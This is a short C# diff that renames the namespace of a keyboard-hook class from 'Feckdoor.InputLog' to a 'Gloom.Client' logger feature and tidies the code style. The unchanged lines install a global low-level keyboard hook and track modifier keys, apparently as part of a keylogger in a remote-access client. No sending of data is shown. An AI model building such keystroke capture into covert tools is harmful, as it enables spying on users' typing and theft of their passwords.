@@ -1,7 +1,7 @@
 ﻿using Serilog;
 using System.Diagnostics;
 
-namespace Feckdoor.InputLog
+namespace Gloom.Client.Features.Logger.InputLog
 {
 	public static class KeyboardHook
 	{
@@ -22,7 +22,7 @@ namespace Feckdoor.InputLog
 		public static void InstallHook()
 		{
 			using var process = Process.GetCurrentProcess();
-			using ProcessModule? module = process.MainModule;
+			using var module = process.MainModule;
 			if (module != null)
 				HookHandle = User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, MyCallback, module.BaseAddress, 0);
 			else
@@ -45,7 +45,7 @@ namespace Feckdoor.InputLog
 					} // trunc
 
 					// Activate modifier
-					int? modifier = (int?)((VirtualKey)lParam.vkCode).GetModifier();
+					var modifier = (int?)((VirtualKey)lParam.vkCode).GetModifier();
 					if (modifier != null)
 						ActiveModifiers |= (int)modifier;
 				}
@@ -95,7 +95,7 @@ namespace Feckdoor.InputLog
 
 		public KeyboardInputEventArgs(uint vkCode, uint scanCode, ModifierKey modifiers, uint time)
 		{
-			this.VkCode = vkCode;
+			VkCode = vkCode;
 			ScanCode = scanCode;
 			Modifier = modifiers;
 			Time = time;
